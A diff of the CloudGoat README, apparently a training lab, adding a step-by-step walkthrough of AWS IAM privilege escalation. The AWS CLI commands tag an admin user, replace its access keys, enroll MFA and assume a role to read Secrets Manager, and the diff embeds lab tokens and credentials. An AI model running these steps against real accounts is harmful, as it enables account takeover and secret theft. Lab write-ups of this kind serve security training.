+   aws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id 'us-east-1:7cf5a63a-918b-c3b0-c8cb-925fd9b10bde' --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_qVmR5N4kh=eyJraWQiOiJmZkpqYXNrcGIxNDRRN2RZVlVzTk9SSkFSWmFNZDVXa3VnWDB6bTQyaUVvPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfcVZtUjVONGtoIiwiY29nbml0bzp1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSIsImdpdmVuX25hbWUiOiJ0ZXN0MDEiLCJjdXN0b206YWNjZXNzIjoiYWRtaW4iLCJvcmlnaW5fanRpIjoiNGFiMWExNTAtMGRmNC00MTRhLWI5MWMtYWU0N2MyYmZjMTUzIiwiYXVkIjoiMjhwcHA4bHNkOHRyMGFyaXEyYmczdTJvbnEiLCJldmVudF9pZCI6IjVhYjdlYmIyLWNhMzItNGM4Zi04YTAzLTQyZDU5ODJmYzIwYyIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzM3NjQ0NDg3LCJleHAiOjE3Mzc2NDgwODcsImlhdCI6MTczNzY0NDQ4NywiZmFtaWx5X25hbWUiOiJ0ZXN0MDEiLCJqdGkiOiJmNTliYjVmYS00MDIwLTQyYzEtYjA4ZS00MDQ4NTA0ODBhNzMiLCJlbWFpbCI6Inpvdnl0ZW11QHRlbGVnLmV1In0.hgGGTqrCBhyU0a1-FTP2wh4ARXx2iQSlUhLWzsy-xDqrWvGfhKfJAVlcy2ICP_ys9u14A2r-LGDZu65I0WlYxIHSh3apilgUGeol4NhB2YmtczCiyc1JD_7aOPJiCn5WNnnLpGxy_5jQBb5Ahbyg1Y0RWjt1AZYsx9tJXS1sig_-kpJL0A24fpkG9pKOyymivXZ2wuBM06fO9C4nxpgKeFjxtri_vk3j12d1W9jvg0ydFkXpFrJDSCfztD2Gisd18H3MDLpQsLkCYRUsOzpWDoyUT9S-SMIq1RInIr9vB6CKsvob5Mh-53UJ8we7jBqRaFoghN4cBZZFm-6o0nLItQ"
+   ```
+   As such, we have obtain administrator access key, secret key and session ID
+   ![](images/vulnerable_cognito/image18.png)
+
+#### Root Cause
+- Implement serverside validation for sign up so both frontend and backend are aligned.
+- As update attributes can be called publicly, do not implement access control via attributes
+
+
+
 
 ### iam_privesc_by_key_rotation (Small / Easy)
-
-`$ ./cloudgoat.py create iam_privesc_by_key_rotation`
-
 Exploit insecure IAM permissions to escalate your access. Start with a role tha manages other users credentials and find a weakness in the setup to access the "admin" role. Using the admin role retrieve the flag from secretsmanager.
 
 Contributed by [infrasec.sh](https://infrasec.sh/).
 
 [Visit Scenario Page.](scenarios/iam_privesc_by_key_rotation/README.md)
+#### Setup Scenario
+1. Run the following command
+`$ ./cloudgoat.py create iam_privesc_by_key_rotation`
+
+2. Configure AWS profile `aws configure --profile manager`
+   Enter the access key and secret key given when creating scenario. You may leave region name and output format as empty.
+
+
+3. Run this command to verify if profile has been setup (akin to whoami) `aws sts get-caller-identity --profile manager`
+
+   Result:
+   ![](images/iam_privesc_by_key_rotation/image1.png)
+
+#### Walkthrough
+1. Enumerate policies attached to user. There are 2 policies found attached to user.
+   ```
+   aws --profile manager --region us-east-1 iam list-user-policies --user-name manager_iam_privesc_by_key_rotation_cgidm3vx44qe91
+   ```
+
+2. Check actions found in both policy.
+**SelfManageAccess**
+   ```
+   aws --profile manager iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name SelfManageAccess
+   ```
+   Policy have IAM actions to perform CRUD on MFA devices and access keys. Performing CRUD actions require **ResourceTag/Developer == TRUE**
+   ![](images/iam_privesc_by_key_rotation/image3.png)
+
+**TagResources**
+   ```
+   aws --profile manager iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name TagResources
+   ```
+   Policy have IAM actions to perform CRUD on tags.
+   ![](images/iam_privesc_by_key_rotation/image4.png)
+3. Enumerate all users
+   ```
+   aws iam list-users --profile manager
+   ```
+   A total of 3 users (excluding myself) was found.
+   * Admin
+   * Manager
+   * Developer
+   
+   ![](images/iam_privesc_by_key_rotation/image5.png)
+   
+4. Enumerate Admin user
+Check Admin policy
+   ```
+   aws iam list-attached-user-policies --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
+   ```
+   Attached User Policy: Admin only have **IAMReadOnlyAccess**
+   ![](images/iam_privesc_by_key_rotation/image6.png)
+   Check user policy
+   ```
+   aws --profile manager iam list-user-policies --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91
+   ```
+   User Policy: Admin can **AssumeRoles**
+   ![](images/iam_privesc_by_key_rotation/image7.png)
+   Check **AssumeRoles** action:
+   ```
+   aws --profile manager iam get-user-policy --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name AssumeRoles
+   ```
+   A resource is tagged to action. This is tagged to another role **secretsmanager**
+   ![](images/iam_privesc_by_key_rotation/image8.png)
+   Check **secretsmanager** role
+   ```
+   aws --profile manager iam get-role --role-name cg_secretsmanager_iam_privesc_by_key_rotation_cgidm3vx44qe91
+   ```
+   **MultiFactorAuthPresent** needs to be true to use **AssumeRole**
+   ![](images/iam_privesc_by_key_rotation/image9.png)
+   
+5. Enumerate secretsmanager role
+Check role policies
+   ```
+   aws iam list-attached-role-policies --role-name cg_secretsmanager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
+   ```
+   PolicyName and ARN was given
+   ![](images/iam_privesc_by_key_rotation/image10.png)
+   Check policy by policyARN
+   ```
+   aws iam get-policy --policy-arn arn:aws:iam::536697256593:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
+   ```
+   Policy details and version is given
+   ![](images/iam_privesc_by_key_rotation/image11.png)
+   List all policy actions by version
+   ```
+   aws iam get-policy-version --policy-arn arn:aws:iam::536697256593:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidm3vx44qe91 --version-id v1
+   ```
+   **secretsmanager** can **ListSecrets** and **GetSecretValue**
+   ![](images/iam_privesc_by_key_rotation/image12.png)
+
+6. Enumerate developer user
+Check attached policies
+   ```
+   aws iam list-attached-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
+   ```
+   Result: None
+   ![](images/iam_privesc_by_key_rotation/image13.png)
+   Check user policies
+   ```
+   aws --profile manager iam list-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91
+   ```
+   Result: **DeveloperViewSecrets**
+   ![](images/iam_privesc_by_key_rotation/image14.png)
+   Check **DeveloperViewSecrets** actions
+   ```
+   aws --profile manager iam get-user-policy --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name DeveloperViewSecrets
+   ```
+   Result: Allow **ListSecrets**
+   ![](images/iam_privesc_by_key_rotation/image15.png)
+
+7. Here are the information we have gathered thus far
+* Manager can modify tags without condition
+* Manager can modify MFA devices and access key if **developer** tag  == **true**
+* Admin can assume role if **MFA** == **true**
+* Developer has a role **secretsmanager** that allows viewing of secrets
+As such, we can formulate an attack plan.
+Manager will add **developer** tag to admin → Manager create new access key for admin → Manager create MFA for admin → Using Admin, assume **secretsmanager** role → Get secrets  
+
+8. Starting with the first step, let's add **developer** tag to admin user.
+   ```
+   aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --tags '{"Key":"developer","Value":"true"}' --profile manager
+   ```
+9. Create access key for **admin** user
+   ```
+   aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
+   ```
+   However, there's an error stating that 2 existing keys are in place
+   ![](images/iam_privesc_by_key_rotation/image16.png)
+   List all access keys
+   ```
+   aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
+   ```
+   Result: 2 existing keys were found
+   ![](images/iam_privesc_by_key_rotation/image17.png)
+   Delete 1 of the access key
+   ```
+   aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --access-key-id AKIAXZ5NGHKIV3ZJ7HPP --profile manager
+   ```
+   Create a new access key for admin user
+   ```
+   aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
+   ```
+   Result: New access key and secret access key for admin user
+   ![](images/iam_privesc_by_key_rotation/image18.png)
+
+10. Next, add MFA for admin user
+   ```
+   aws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG --profile manager
+   ```
+   Result: A MFA serial number is formed. A QR code is generated in the same file path
+   ![](images/iam_privesc_by_key_rotation/image19.png)
+   Scan the TOTP using an authenticator app an insert the OTP
+   ```
+   aws --profile manager iam enable-mfa-device \
+       --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 \
+       --serial-number arn:aws:iam::536697256593:mfa/cloudgoat_virtual_mfa \
+       --authentication-code1 594489 \
+      --authentication-code2 680484
+   ```
+11. Configure admin user 
+   ```
+   Aws configure --profile admin
+   ```
+   ![](images/iam_privesc_by_key_rotation/image20.png)
+
+12. Using admin, assume **secretsmanager** role
+   ```
+   aws --profile admin sts assume-role --role-arn arn:aws:iam::536697256593:role/cg_secretsmanager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --role-session-name developer --serial-number arn:aws:iam::536697256593:mfa/cloudgoat_virtual_mfa --token-code 398592
+   ```
+   Result: Access keys are given
+   ![](images/iam_privesc_by_key_rotation/image21.png)
+
+13. Configure **developer** profile with **secretsmanager** role using the given access keys
+   ```
+   aws configure --profile developer
+   ```
+   Set session token
+   ```
+   aws configure set aws_session_token FwoGZXIvYXdzEDMaDNm5P4HVU6ThZjrKoiKtARievSSntgJBaBSpBruILnYHoFkunF3Nc2SrvDtpezvoeKFExsUoJS11Is3AabFUC6bmNxcNrPu02INC3pRYWkPo/UevMCc7OMkt4ORPuIryFs2ugQV/o2WnaDbtjV6ajx5yV8Vni4A7Xtt59icujbHWoIV3vzKbDelD4Pe+36NzF+iy2YHbTCKCdcxIwpq15YLNiGONm+pQwg2SDzG3XYTwugwsSrLzkw8wNm1eKNTo0rwGMi2khoqANlYM6FUnkjPCbAWsP379l0WqCX45VHCfEYlHmuOCdTh/mVc/XEAw7i4= --profile developer
+   ```
+
+14. List secrets
+   ```
+   aws secretsmanager list-secret --profile developer
+   ```
+   Result: View list of secrets
+   ![](images/iam_privesc_by_key_rotation/image22.png)
+   Get secrets value
+   ```
+   aws secretsmanager get-secret-value --profile developer --secret-id arn:aws:secretsmanager:us-east-1:536697256593:secret:cg_secret_iam_privesc_by_key_rotation_cgidm3vx44qe91-
+   71BGjx
+   ```
+   Result: Flag found
+   ![](images/iam_privesc_by_key_rotation/image23.png)
+
+   
+#### Root Cause
+- Insufficient access control for users and roles
 
-### iam_privesc_by_rollback (Small / Easy)
-
-`$ ./cloudgoat.py create iam_privesc_by_rollback`
-
-Starting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.
-
-[Visit Scenario Page.](scenarios/iam_privesc_by_rollback/README.md)
-
-### lambda_privesc (Small / Easy)
-
-`$ ./cloudgoat.py create lambda_privesc`
-
-Starting as the IAM user Chris, the attacker discovers that they can assume a role that has full Lambda access and pass role permissions. The attacker can then perform privilege escalation using these new permissions to obtain full admin privileges.
-
-> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.
-
-[Visit Scenario Page.](scenarios/lambda_privesc/README.md)
-
-### sqs_flag_shop (Small / Easy)
-
-`$ ./cloudgoat.py create sqs_flag_shop`
-
-First, start with the SHOP page where you can buy FLAG. The website has a number of pages, and you can see that the source code is exposed. Attackers analyze the code to find vulnerabilities and use their privileges to purchase FLAG.
-
-[Visit Scenario Page.](scenarios/sqs_flag_shop/README.md)
-
-### cloud_breach_s3 (Small / Moderate)
-
-`$ ./cloudgoat.py create cloud_breach_s3`
-
-Starting as an anonymous outsider with no access or privileges, exploit a misconfigured reverse-proxy server to query the EC2 metadata service and acquire instance profile keys. Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.
-
-[Visit Scenario Page.](scenarios/cloud_breach_s3/README.md)
-
-### iam_privesc_by_attachment (Medium / Moderate)
-
-`$ ./cloudgoat.py create iam_privesc_by_attachment`
-
-Starting with a very limited set of permissions, the attacker is able to leverage the instance-profile-attachment permissions to create a new EC2 instance with significantly greater privileges than their own. With access to this new EC2 instance, the attacker gains full administrative powers within the target account and is able to accomplish the scenario's goal - deleting the cg-super-critical-security-server and paving the way for further nefarious actions.
-
-> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.
-
-[Visit Scenario Page.](scenarios/iam_privesc_by_attachment/README.md)
-
-### ec2_ssrf (Medium / Moderate)
-
-`$ ./cloudgoat.py create ec2_ssrf`
-
-Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.
-
-[Visit Scenario Page.](scenarios/ec2_ssrf/README.md)
-
-### ecs_takeover (Medium / Moderate)
-
-`$ ./cloudgoat.py create ecs_takeover`
-
-Starting with access to the external website, the attacker needs to find a remote code execution vulnerability. By using
-RCE the attacker can get access to resources available to the website container. Abusing several ECS misconfigurations the
-attacker gains access to IAM permissions that allow them to force ECS into rescheduling the target container to a
-compromised instance.
-
-[Visit Scenario Page.](scenarios/ecs_takeover/README.md)
-
-### rds_snapshot (Medium / Moderate)
-
-`$ ./cloudgoat.py create rds_snapshot`
-
-In this scenario, we start with the user 'David'. Through David, you can leverage privileges to steal credentials.
-With the stolen credentials, an attacker can leverage the RDS vulnerability to access the DB and retrieve flags.
-
-> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`. 
-
-[Visit Scenario Page.](scenarios/rds_snapshot/README.md)
-
-### rce_web_app (Medium / Hard)
-
-`$ ./cloudgoat.py create rce_web_app`
-
-Starting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes confidential files and culminates in access to the scenario’s goal: a highly-secured RDS database instance.
-
-Alternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets, eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.
-
-[Visit Scenario Page.](scenarios/rce_web_app/README.md)
-
-### codebuild_secrets (Large / Hard)
-
-`$ ./cloudgoat.py create codebuild_secrets`
-
-Starting as the IAM user Solo, the attacker first enumerates and explores CodeBuild projects, finding unsecured IAM keys for the IAM user Calrissian therein. Then operating as Calrissian, the attacker discovers an RDS database. Unable to access the database's contents directly, the attacker can make clever use of the RDS snapshot functionality to acquire the scenario's goal: a pair of secret strings.
-
-Alternatively, the attacker may explore SSM parameters and find SSH keys to an EC2 instance. Using the metadata service, the attacker can acquire the EC2 instance-profile's keys and push deeper into the target environment, eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.
-
-> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.
-
-[Visit Scenario Page.](scenarios/codebuild_secrets/README.md)
-
-### cicd (Medium / Moderate)
-
-`$ ./cloudgoat.py create cicd`
-
-FooCorp is a company exposing a public-facing API. Customers of FooCorp submit sensitive data to the API every minute. The API is implemented as a Lambda function, exposed through an API Gateway. Because FooCorp implements DevOps, it has a continuous deployment pipeline automatically deploying new versions of their Lambda function from source code to production in under a few minutes.
-
-Your goal: steal the sensitive data submitted by FooCorp customers!
-
-Contributed by Datadog.
-
-[Visit Scenario Page.](scenarios/cicd/README.md)
-
-### detection_evasion (Medium / Hard)
-
-`$ ./cloudgoat.py create detection_evasion`
-
-The goal of this scenario is to read out the values for both secrets without being detected. The secrets are both stored
-in Secrets Manager, and their values have the following format (cg-secret-XXXXXX-XXXXXX).
-
-This scenario is significantly different from other CloudGoat scenarios. In detection_evasion, your goals will be
-outlined for you more clearly, and the challenge is to complete them without triggering alarms. There is more setup
-involved in this scenario, and it will take longer to play (you might want/need to play it multiple times).
-
-[Visit Scenario Page.](scenarios/detection_evasion/README.md)
-
-### ecs_efs_attack (Large / Hard)
-
-`$ ./cloudgoat.py create ecs_efs_attack`
-
-Starting with access the "ruse" EC2 the user leverages the instace profile to backdoor the running ECS container. Using the backdoored container the attacker can retireve credentials from the container metadata API. These credentials allow the attacker to start a session on any EC2 with the proper tags set. The attacker uses their permissions to change the tags on the Admin EC2 and starts a session. Once in the Admin EC2 the attacker will port scan the subnet for an open EFS to mount. Once mounted the attacker can retrieve the flag from the elastic file system.
-
-[Visit Scenario Page.](scenarios/ecs_efs_attack/README.md)
-
-### glue_privesc(Large / Moderate)
-
-`$ ./cloudgoat.py create glue_privesc`  
-
-This scenario starts with a web page that uploads a CSV file and performs data visualization through the Glue service.
-The attacker steals the credentials present on the webpage via a SQL injection attack and uploads a reverse shell to create a Glue Job to obtain the secret string
-
-> **Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.  
-
-[Visit Scenario Page.](scenarios/glue_privesc/README.md)
-
-## Usage Guide
-
-The basic anatomy of a CloudGoat command is as follows:
-
-> `$ ./cloudgoat.py [ command ] [ sub-command ] [ --arg-name ] [ arg-value ]`
-
-The five main commands in CloudGoat are summarized below:
-
-### create
-
-`create [ scenario-name ]` deploys a scenario to the AWS account of your choosing. You can also run `create` against an existing scenario if you wish - CloudGoat will simply destroy and recreate the scenario named.
-
-> **Tip:** you can use `/scenarios` in the name, which allows for bash's native tab-completion.
-
-Note that the `--profile` is required for safety reasons - we don't want anyone accidentally deploying CloudGoat scenarios to a production environment - and CloudGoat will not use the system's "default" AWS CLI profiles or profiles specified as defaults via environment variables. You can, however, set this via `config profile` to avoid having to provide it every time.
-
-### list
-
-`list` shows some information about `all`, `undeployed`, or `deployed` scenarios, or even a lot of information about a `[ scenario-name ]` that's already deployed.
-
-### destroy
-
-`destroy` shuts down and deletes a `[ scenario-name ]`'s cloud resources, and then moves the scenario instance folder to `./trash` - just in case you need to recover the Terraform state file or other scenario files. You can also specify `all` instead of a scenario name to destroy all active scenarios.
-
-> **Tip:** CloudGoat can only manage resources it creates. If you create any resources yourself in the course of a scenario, you should remove them manually before running the `destroy` command.
-
-### config
-
-`config` allows you to manage various aspects of your CloudGoat installation, specially the IP `whitelist`, your default AWS `profile`, and tab-completion via `argcomplete`. It's worth briefly describing what each of these sub-commands do.
-
-#### whitelist
-
-CloudGoat needs to know what IP addresses should be whitelisted when potentially-vulnerable resources are deployed in the cloud, and these IPs are tracked in a `./whitelist.txt` file in the base project directory. The IP address you provide for whitelisting doesn't _have_ to be in CIDR format, but CloudGoat will add a `/32` to any naked IPs you provide. Optionally, you can add the `--auto` argument, and CloudGoat will automatically make a network request, using curl to ifconfig.co to find your IP address, and then create the whitelist file with the result.
-
-#### profile
-
-While CloudGoat will not ever use the system's "default" AWS CLI profiles or profiles specified as defaults via environment variables, you can instruct CloudGoat to use a particular AWS profile by name using the `config profile` command. This will prompt for and save your profile's name in a `config.yml` file in the base project directory. As long as that file is present CloudGoat will use the profile name listed inside for create and destroy commands, rather than requiring the `--profile` flag. You can run the `config profile` command at any time to view the name of your CloudGoat-default profile and validate the format of the `config.yml`. You can also create `config.yml` manually, if you wish, provided that you use the correct format.
-
-#### argcomplete
-
-We really wanted to have native tab-completion in CloudGoat, but as it turns out that was somewhat difficult to do outside of a REPL. It should work reasonably well for Linux users, and those OSX users brave enough to figure out a way to upgrade their bash version to 4.2+. CloudGoat does include and support [the python library "argcomplete"](https://github.com/kislyuk/argcomplete). A brief summary of how to install argcomplete is provided below, though for more detailed steps you should refer to the official documentation at the library's [github page](https://github.com/kislyuk/argcomplete).
-
-1. Install the argcomplete Python package using CloudGoat's requirements.txt file: `$ pip3 install -r core/python/requirements.txt`
-2. In bash, run the global Python argument completion script provided by the argcomplete package: `$ activate-global-python-argcomplete`
-3. Source the completion script at the location printed by the previous activation command, or restart your shell session: `$ source [ /path/to/the/completion/script ]`
-
-For those who cannot or do not wish to configure argcomplete, CloudGoat also supports the use of directory paths as scenario names, which means tab-completion will work for scenario names. Just use `/scenario/[ scenario-name ]` or `./[ scenarioinstance-name ]` and your shell should do the rest.
-
-### help
-
-`help` provides contextual help about commands. `help` can come before or after the command in question, so it's always there when you need it. Below are some examples:
-
-* `$ ./cloudgoat.py create help`
-* `$ ./cloudgoat.py destroy help`
-* `$ ./cloudgoat.py list help`
-* `$ ./cloudgoat.py config help`
-
-One other use of note: `$ ./cloudgoat.py [ scenario-name ] help` can be used to print to the console a brief summary of the scenario, as defined by the scenario's author.
-
-## Feature Requests and Bug Reports
-
-If you have a feature request or a bug to report, please [submit them here](https://github.com/RhinoSecurityLabs/cloudgoat/issues/new).
-
-For bugs, please make sure to include a description sufficient to reproduce the bug you found, including tracebacks and reproduction steps, and check for other reports of your bug before filing a new bug report.
-
-For features, much the same applies! Be specific in your request, and make sure someone else hasn't already requested the same feature.
-
-## Contribution Guidelines
-
-Contributions to CloudGoat are greatly appreciated. If you'd like to help make the project better, read on.
-
-1. **Creating a New Scenario**:
-   - We have provided a scenario template to help you get started quickly. The template includes the basic structure and necessary files for a CloudGoat scenario. You can find the scenario template [here](/scenarios/scenario_template).
-   - **Steps to Create a New Scenario**:
-     - **Copy the Template**: Copy the contents of the scenario template to a new directory named after your scenario.
-     - **Modify the Template**: Replace the placeholder content in the template with the specifics of your new scenario.
-     - **Test the Scenario**: Ensure that your scenario works as expected by testing it thoroughly.
-2. **Coding Standards**:
-   - **Code Style**: Follow the existing code style in the project. Consistency is key.
-   - **Comments**: Add comments to your code where necessary to explain complex logic or important decisions.
-   - **Documentation**: Update the README.md and other relevant documentation to include details about your new scenario or changes.
-3. **Whitelisting**:
-   - When creating or modifying scenarios, keep the following in mind:
-     - **Whitelisting**: Ensure that security group rules and other access controls are configured to whitelist only the IP from the CloudGoat configuration.
-     - **Review**: Double-check your configurations for any potentially vulnerable public resources before contributing (i.e. do not create vulnerable EC2s accessible to the internet). 
-4. **Python Code Style**:
-   - Python code in CloudGoat should generally follow Python's style conventions, favoring readability and maintainability above all.
-   - Follow good git practices: use pull requests, prefer feature branches, always write clear commit messages.
-   - CloudGoat uses `black` and `flake8` - Python syntax and style linters. Ensure that both `flake8` and `black` are run on all Python files in `core/python/` and on `cloudgoat.py` before committing code. `black`'s decisions take priority over `flake8`'s. Both of these are commented out in the `core/python/requirements.txt` file since normal users don't need them.
-5. **Licensing**:
-   - CloudGoat code should always use the BSD 3-clause license.
-
-And lastly, thank you for contributing!
-
-
-## Changelog
-
-- **6/24/19:** CloudGoat 2.0 is released!
 
 ## Disclaimer
 
